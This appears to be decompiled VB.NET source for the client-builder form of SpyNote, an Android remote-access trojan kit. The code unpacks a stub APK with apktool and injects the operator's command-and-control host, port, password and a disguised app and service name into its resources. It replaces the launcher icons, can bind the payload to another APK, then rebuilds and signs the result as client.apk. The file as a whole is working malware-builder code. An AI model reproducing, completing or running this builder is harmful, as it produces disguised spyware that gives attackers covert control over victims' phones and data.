Imports Microsoft.VisualBasic.CompilerServices
Imports System.ComponentModel
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.IO
Imports System.IO.Compression
Imports System.Runtime.CompilerServices
Imports System.Threading
Public Class Build_client
    Private folder_Building As String

    Private folder_apktool As String

    Private Const name_static As String = "app-release"

    Private start As DateTime

    Public name_folder_app_resource As String

    Private OKY As Boolean

    Private cmd_0 As Object

    Private xx As Boolean

    Private cmd_running_cmd As Boolean

    Public Resources As String

    Private sttList As List(Of String)

    Private str As String()
    Public Sub New()
        Me.name_folder_app_resource = "App_Resources"
        Me.xx = False
        Me.cmd_running_cmd = False
        Me.sttList = New List(Of String)()
        Me.InitializeComponent()
    End Sub

    Private Sub AFunction()
        Me.title("Build Client", Nothing)
        Me.start = DateTime.Now
        While True
            Thread.Sleep(10)
            Dim str As String = Conversions.ToString(Me.getDriv())
            Me.folder_Building = String.Concat(str, "Building-6.1")
            Me.folder_apktool = String.Concat(str, "Building-6.1\apktool")
            Try
                If (Not My.Computer.FileSystem.DirectoryExists(Me.folder_Building)) Then
                    My.Computer.FileSystem.CreateDirectory(Me.folder_Building)
                ElseIf (Not My.Computer.FileSystem.DirectoryExists(Me.folder_apktool)) Then
                    Me.File_zip_Decompress(String.Concat(Me.Resources, "\apktool.zip"), String.Concat(Me.folder_Building, "\"))
                ElseIf (My.Computer.FileSystem.DirectoryExists(Me.folder_Building) And My.Computer.FileSystem.DirectoryExists(Me.folder_apktool)) Then
                    If (Not My.Computer.FileSystem.DirectoryExists(String.Concat(Me.folder_apktool, "\app-release"))) Then
                        Me.OKY = True
                        If (Me.OKY) Then
                            If (File.Exists(String.Concat(Me.folder_apktool, "\app-release.apk"))) Then
                                File.Delete(String.Concat(Me.folder_apktool, "\app-release.apk"))
                            End If
                            If (File.Exists(String.Concat(Me.folder_apktool, "\out\client.apk"))) Then
                                File.Delete(String.Concat(Me.folder_apktool, "\out\client.apk"))
                            End If
                            File.Copy(String.Concat(Me.Resources, "\stub.apk"), String.Concat(Me.folder_apktool, "\app-release.apk"))
                            Me.step0()
                        End If
                        Exit While
                    Else
                        Directory.Delete(String.Concat(Me.folder_apktool, "\app-release"), True)
                    End If
                End If
            Catch exception As System.Exception
                Me.OKY = False
                MyBase.Close()
                Return
            End Try
        End While
    End Sub

    Private Sub Build_client_Closing(ByVal sender As Object, ByVal e As CancelEventArgs) Handles Me.Closing
        If (Me.xx) Then
            Me.close_cmd()
        End If
    End Sub

    Private Sub Build_client_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        Try
            Dim str As String = Interaction.Command()
            If (Operators.CompareString(str, Nothing, False) = 0) Then
                MyBase.Close()
            ElseIf (Operators.CompareString(str, "n -160", False) <> 0) Then
                MyBase.Close()
            Else
                Me.Resources = Application.StartupPath.ToString()
                Me.title("Build Client", Nothing)
                Dim streamReader As System.IO.StreamReader = New System.IO.StreamReader(String.Concat(Me.Resources, "\s.inf"))
                Me.str = File.ReadAllLines(String.Concat(Me.Resources, "\s.inf"))
                Dim strArrays As String() = Me.str
                Dim num As Integer = 0
                While num < CInt(strArrays.Length)
                    Dim str1 As String = strArrays(num)
                    Me.sttList.Add(str1)
                    num = num + 1
                End While
                Dim thread As System.Threading.Thread = New System.Threading.Thread(New ThreadStart(AddressOf Me.AFunction)) With
                {
                    .IsBackground = True
                }
                thread.Start()
            End If
        Catch exception As System.Exception
            Interaction.MsgBox(exception.ToString(), MsgBoxStyle.OkOnly, Nothing)
            MyBase.Close()
        End Try
    End Sub

    Private Sub close_cmd()
        Me.cmd_running_cmd = False
        Me.xx = False
        Try
            Try
                NewLateBinding.LateCall(Me.cmd_0, Nothing, "CancelOutputRead", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            Catch exception As System.Exception
            End Try
            Try
                NewLateBinding.LateCall(Me.cmd_0, Nothing, "CancelErrorRead", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            Catch exception1 As System.Exception
            End Try
            Try
                NewLateBinding.LateCall(Me.cmd_0, Nothing, "Kill", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            Catch exception2 As System.Exception
            End Try
            Try
                NewLateBinding.LateCall(Me.cmd_0, Nothing, "Close", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            Catch exception3 As System.Exception
            End Try
        Catch exception4 As System.Exception
        End Try
        Me.cmd_0 = Nothing
        MyBase.Close()
    End Sub

    Public Function cmd_running() As Boolean
        Dim flag As Boolean
        Try
            Me.cmd_0 = New Process()
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "RedirectStandardOutput", New Object() {True}, Nothing, Nothing, False, True)
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "RedirectStandardInput", New Object() {True}, Nothing, Nothing, False, True)
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "RedirectStandardError", New Object() {True}, Nothing, Nothing, False, True)
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "FileName", New Object() {"cmd.exe"}, Nothing, Nothing, False, True)
            AddHandler DirectCast(Me.cmd_0, Process).OutputDataReceived, New DataReceivedEventHandler(AddressOf Me.Sync_Output)
            AddHandler DirectCast(Me.cmd_0, Process).ErrorDataReceived, New DataReceivedEventHandler(AddressOf Me.Sync_Output)
            AddHandler DirectCast(Me.cmd_0, Process).Exited, New EventHandler(Sub(a0 As Object, a1 As EventArgs) Me.ex())
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "UseShellExecute", New Object() {False}, Nothing, Nothing, False, True)
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "CreateNoWindow", New Object() {True}, Nothing, Nothing, False, True)
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "WindowStyle", New Object() {ProcessWindowStyle.Hidden}, Nothing, Nothing, False, True)
            NewLateBinding.LateSet(Me.cmd_0, Nothing, "EnableRaisingEvents", New Object() {True}, Nothing, Nothing)
            NewLateBinding.LateCall(Me.cmd_0, Nothing, "Start", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateCall(Me.cmd_0, Nothing, "BeginOutputReadLine", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateCall(Me.cmd_0, Nothing, "BeginErrorReadLine", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            Me.cmd_running_cmd = True
            flag = True
        Catch exception As System.Exception
            ProjectData.SetProjectError(exception)
            flag = False
            ProjectData.ClearProjectError()
        End Try
        Return flag
    End Function

    Private Sub ex()
        If (Me.xx) Then
            Interaction.MsgBox("cmd.exe Unexpectedly closed !!", MsgBoxStyle.Critical, "SpyNote")
            Thread.Sleep(1000)
            Me.close_cmd()
        End If
    End Sub

    Private Sub File_zip_Decompress(ByVal zipPath As String, ByVal pathfolder As String)
        Try
            If (Not Directory.Exists(pathfolder)) Then
                Directory.CreateDirectory(pathfolder)
            End If
            ZipFile.ExtractToDirectory(zipPath, pathfolder)
        Catch exception As System.Exception
            Interaction.MsgBox(exception.ToString(), MsgBoxStyle.OkOnly, Nothing)
            Return
        End Try
    End Sub

    Public Function getDriv() As Object
        Dim obj As Object
        Try
            Dim executablePath As String = Application.ExecutablePath
            Dim strArrays As String() = executablePath.Split(New String() {"\"}, StringSplitOptions.RemoveEmptyEntries)
            obj = String.Concat(strArrays(0).ToString(), "\")
        Catch exception As System.Exception
            obj = "C:\"
        End Try
        Return obj
    End Function

    Private Sub Image_scaling(ByVal w_00 As Object, ByVal h_00 As Object, ByVal n_00 As Object)
        Try
            If (Operators.CompareString(Me.sttList(0), "..", False) <> 0) Then
                If (Me.xx) Then
                    Dim bitmap As System.Drawing.Bitmap = New System.Drawing.Bitmap(Me.sttList(0))
                    Dim [integer] As Integer = Conversions.ToInteger(w_00)
                    Dim num As Integer = Conversions.ToInteger(h_00)
                    Dim bitmap1 As System.Drawing.Bitmap = New System.Drawing.Bitmap([integer], num)
                    Dim graphic As Graphics = Graphics.FromImage(bitmap1)
                    graphic.InterpolationMode = InterpolationMode.Low
                    graphic.DrawImage(bitmap, New Rectangle(0, 0, [integer], num), New Rectangle(0, 0, bitmap.Width, bitmap.Height), GraphicsUnit.Pixel)
                    graphic.Dispose()
                    Dim n00() As Object = {n_00, ImageFormat.Png}
                    Dim objArray As Object() = n00
                    Dim flagArray() As Boolean = {True, False}
                    Dim flagArray1 As Boolean() = flagArray
                    NewLateBinding.LateCall(bitmap1, Nothing, "Save", n00, Nothing, Nothing, flagArray, True)
                    If (flagArray1(0)) Then
                        n_00 = RuntimeHelpers.GetObjectValue(objArray(0))
                    End If
                    bitmap.Dispose()
                    bitmap1.Dispose()
                End If
            End If
        Catch exception As System.Exception
            MsgBox(exception.ToString(), MsgBoxStyle.OkOnly, Nothing)
        End Try
    End Sub
    Public Sub prog(ByVal v As Integer)
        If (Not MyBase.InvokeRequired) Then
            Me.ThemeProgressBar1.Value = v
        Else
            Dim _prg As Build_client.prg = New Build_client.prg(AddressOf Me.prog)
            MyBase.Invoke(_prg, New Object() {v})
        End If
    End Sub

    Private Sub re_a()
        While Me.xx
            While True
                Thread.Sleep(10)
                Dim str As String = String.Concat(Me.folder_apktool, "\app-release\res\values\strings.xml")
                If (Not File.Exists(str)) Then
                    Exit While
                End If
                Try
                    Dim str1 As String = My.Computer.FileSystem.ReadAllText(str).Replace("[SPY_NOTE_APP_NAME_OK]", Me.sttList(2)).Replace("[SPY_NOTE_HOST_OK]", Me.sttList(5)).Replace("[SPY_NOTE_PORT_OK]", Me.sttList(6)).Replace("[SPY_NOTE_PASS_OK]", Me.sttList(7)).Replace("[SPY_NOTE_CLIENT_NAME_OK]", Me.sttList(1)).Replace("[SPY_NOTE_SERVICE_NAME_OK]", Me.sttList(3)).Replace("[SPY_NOTE_VERSION_OK]", Me.sttList(4)).Replace("[SPY_NOTE_PROPERTIES_OK]", Me.sttList(8)).Replace("[SPY_NOTE_MERGE_OK]", Me.sttList(10))
                    File.WriteAllText(str, str1)
                    GoTo Label0
                Catch exception As System.Exception
                End Try
            End While
        End While
Label7:
        Me.prog(20)
        While True
            If (Me.xx) Then
                While True
                    Thread.Sleep(10)
                    Dim str2 As String = String.Concat(Me.folder_apktool, "\app-release\res\mipmap-hdpi\ic_launcher.png")
                    If (Not File.Exists(str2)) Then
                        Exit While
                    End If
                    Try
                        File.Delete(str2)
                        Me.Image_scaling(72, 72, str2)
                        GoTo Label1
                    Catch exception1 As System.Exception
                    End Try
                End While
            Else
                Me.prog(25)
                Exit While
            End If
        End While
Label1:
        While True
            If (Me.xx) Then
                While True
                    Thread.Sleep(10)
                    Dim str3 As String = String.Concat(Me.folder_apktool, "\app-release\res\mipmap-mdpi\ic_launcher.png")
                    If (Not File.Exists(str3)) Then
                        Exit While
                    End If
                    Try
                        File.Delete(str3)
                        Me.Image_scaling(48, 48, str3)
                        GoTo Label2
                    Catch exception2 As System.Exception
                    End Try
                End While
            Else
                Me.prog(30)
                Exit While
            End If
        End While
Label2:
        While True
            If (Me.xx) Then
                While True
                    Thread.Sleep(10)
                    Dim str4 As String = String.Concat(Me.folder_apktool, "\app-release\res\mipmap-xhdpi\ic_launcher.png")
                    If (Not File.Exists(str4)) Then
                        Exit While
                    End If
                    Try
                        File.Delete(str4)
                        Me.Image_scaling(96, 96, str4)
                        GoTo Label3
                    Catch exception3 As System.Exception
                    End Try
                End While
            Else
                Me.prog(35)
                Exit While
            End If
        End While
Label3:
        While True
            If (Me.xx) Then
                While True
                    Thread.Sleep(10)
                    Dim str5 As String = String.Concat(Me.folder_apktool, "\app-release\res\mipmap-xhdpi\ic_launcher.png")
                    If (Not File.Exists(str5)) Then
                        Exit While
                    End If
                    Try
                        File.Delete(str5)
                        Me.Image_scaling(96, 96, str5)
                        GoTo Label4
                    Catch exception4 As System.Exception
                    End Try
                End While
            Else
                Me.prog(40)
                Exit While
            End If
        End While
Label4:
        While True
            If (Me.xx) Then
                While True
                    Thread.Sleep(10)
                    Dim str6 As String = String.Concat(Me.folder_apktool, "\app-release\res\mipmap-xxhdpi\ic_launcher.png")
                    If (Not File.Exists(str6)) Then
                        Exit While
                    End If
                    Try
                        File.Delete(str6)
                        Me.Image_scaling(144, 144, str6)
                        GoTo Label5
                    Catch exception5 As System.Exception
                    End Try
                End While
            Else
                Me.prog(45)
                Exit While
            End If
        End While
Label5:
        While True
            If (Me.xx) Then
                While True
                    Thread.Sleep(10)
                    Dim str7 As String = String.Concat(Me.folder_apktool, "\app-release\res\mipmap-xxxhdpi\ic_launcher.png")
                    If (Not File.Exists(str7)) Then
                        Exit While
                    End If
                    Try
                        File.Delete(str7)
                        Me.Image_scaling(192, 192, str7)
                        If (Me.xx) Then
                            Me.step4()
                        End If
                        Return
                    Catch exception6 As System.Exception
                    End Try
                End While
            Else
                Me.prog(50)
                Exit While
            End If
        End While
        If (Me.xx) Then
            Me.step4()
        End If
        Return
Label0:
        While True
            Thread.Sleep(10)
            Try
                If (Operators.CompareString(Me.sttList(9), "..", False) = 0) Then
                    GoTo Label7
                Else
                    Dim str8 As String = String.Concat(Me.folder_apktool, "\app-release\res\raw\google.apk")
                    If (File.Exists(str8)) Then
                        File.Delete(str8)
                        Dim item As String = Me.sttList(9)
                        If (File.Exists(item)) Then
                            File.Copy(item, str8)
                        End If
                        GoTo Label7
                    End If
                End If
            Catch exception7 As System.Exception
            End Try
        End While
    End Sub

    Private Sub step0()
        If (Me.OKY) Then
            If (Not Me.cmd_running_cmd) Then
                Me.xx = Me.cmd_running()
            End If
            If (Me.xx) Then
                Me.step1()
            End If
        End If
    End Sub

    Private Sub step1()
        If (Me.xx) Then
            NewLateBinding.LateCall(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StandardInput", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "WriteLine", New Object() {"java -version"}, Nothing, Nothing, Nothing, True)
        End If
    End Sub

    Private Sub step2()
        If (Me.xx) Then
            NewLateBinding.LateCall(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StandardInput", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "WriteLine", New Object() {String.Concat("cd ", Me.folder_apktool)}, Nothing, Nothing, Nothing, True)
            Me.step3()
            Me.prog(10)
        End If
    End Sub

    Private Sub step3()
        If (Me.xx) Then
            NewLateBinding.LateCall(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StandardInput", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "WriteLine", New Object() {"apktool d app-release.apk"}, Nothing, Nothing, Nothing, True)
            Me.prog(15)
            Dim thread As System.Threading.Thread = New System.Threading.Thread(New ThreadStart(AddressOf Me.re_a)) With
            {
                .IsBackground = True
            }
            thread.Start()
        End If
    End Sub

    Private Sub step4()
        If (Me.xx) Then
            NewLateBinding.LateCall(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StandardInput", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "WriteLine", New Object() {"apktool b -f -r app-release"}, Nothing, Nothing, Nothing, True)
            Me.step5()
            Me.prog(70)
        End If
    End Sub

    Private Sub step5()
        If (Me.xx) Then
            NewLateBinding.LateCall(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StandardInput", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "WriteLine", New Object() {String.Concat("cd ", Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.User).ToString())}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateCall(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StandardInput", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "WriteLine", New Object() {String.Concat(New String() {"java -jar ", Me.folder_apktool, "\SignApk.jar ", Me.folder_apktool, "\certificate.pem ", Me.folder_apktool, "\key.pk8 ", Me.folder_apktool, "\app-release\dist\app-release.apk ", Me.folder_apktool, "\out\client.apk"})}, Nothing, Nothing, Nothing, True)
            Me.prog(80)
        End If
    End Sub

    Private Sub step6(ByVal b As Boolean)
        While b
            Thread.Sleep(10)
            If (File.Exists(String.Concat(Me.folder_apktool, "\out\client.apk"))) Then
                Process.Start(String.Concat(Me.folder_apktool, "\out"))
                Dim now As TimeSpan = DateTime.Now - Me.start
                Me.prog(100)
                Me.title("Build Client  -idle time {0}", String.Concat(New String() {Conversions.ToString(now.Minutes), "m", Conversions.ToString(now.Seconds), "s", Conversions.ToString(now.Milliseconds), "ms".ToString()}))
                Exit While
            End If
        End While
    End Sub

    Public Sub Sync_Output(ByVal d01 As Object, ByVal b01 As Object)
        Try
            If (Not MyBase.InvokeRequired) Then
                If (Me.RichTextBox1.Text.Length = 0) Then
                    If (File.Exists(String.Concat(Me.Resources, "\apktool.ascii"))) Then
                        Dim streamReader As System.IO.StreamReader = New System.IO.StreamReader(String.Concat(Me.Resources, "\apktool.ascii"))
                        Dim richTextBox1 As RichTextBox = Me.RichTextBox1
                        richTextBox1.SelectionColor = Color.FromArgb(3, 175, 232)
                        richTextBox1.AppendText(String.Concat(streamReader.ReadToEnd().ToString(), Environment.NewLine))
                        richTextBox1.ScrollToCaret()
                        richTextBox1 = Nothing
                        streamReader.Close()
                    End If
                End If
                If (Not String.IsNullOrEmpty(Conversions.ToString(NewLateBinding.LateGet(b01, Nothing, "Data", New Object(-1) {}, Nothing, Nothing, Nothing)))) Then
                    If (NewLateBinding.LateGet(b01, Nothing, "Data", New Object(-1) {}, Nothing, Nothing, Nothing).ToString().Contains("Java(TM) SE Runtime Environment")) Then
                        Me.prog(5)
                        Me.step2()
                    ElseIf (NewLateBinding.LateGet(b01, Nothing, "data", New Object(-1) {}, Nothing, Nothing, Nothing).ToString().Contains("java -jar SignApk.jar") Or NewLateBinding.LateGet(b01, Nothing, "data", New Object(-1) {}, Nothing, Nothing, Nothing).ToString().Contains(String.Concat("java -jar ", Me.folder_apktool, "\SignApk.jar "))) Then
                        Me.prog(80)
                        Dim thread As System.Threading.Thread = New System.Threading.Thread(Sub(a0 As Object) Me.step6(Conversions.ToBoolean(a0))) With
                        {
                            .IsBackground = True
                        }
                        thread.Start(Me.xx)
                    End If
                    Dim hotPink As RichTextBox = Me.RichTextBox1
                    If (NewLateBinding.LateGet(b01, Nothing, "Data", New Object(-1) {}, Nothing, Nothing, Nothing).ToString().StartsWith("W:")) Then
                        hotPink.SelectionColor = Color.HotPink
                    ElseIf (Not NewLateBinding.LateGet(b01, Nothing, "Data", New Object(-1) {}, Nothing, Nothing, Nothing).ToString().StartsWith("I:")) Then
                        hotPink.SelectionColor = Color.Yellow
                    Else
                        hotPink.SelectionColor = Color.LimeGreen
                    End If
                    hotPink.AppendText(String.Concat(NewLateBinding.LateGet(b01, Nothing, "Data", New Object(-1) {}, Nothing, Nothing, Nothing).ToString(), Environment.NewLine))
                    hotPink.ScrollToCaret()
                    hotPink = Nothing
                End If
            Else
                Dim invCmd As Build_client.inv_cmd = New Build_client.inv_cmd(AddressOf Me.Sync_Output)
                MyBase.Invoke(invCmd, New Object() {d01, b01})
                Return
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub title(ByVal t As String, ByVal i As String)
        Me.Text = String.Format(t, i)
    End Sub

    Public Delegate Sub inv_cmd(ByVal d0 As Object, ByVal b0 As Object)

    Public Delegate Sub prg(ByVal v As Integer)
End Class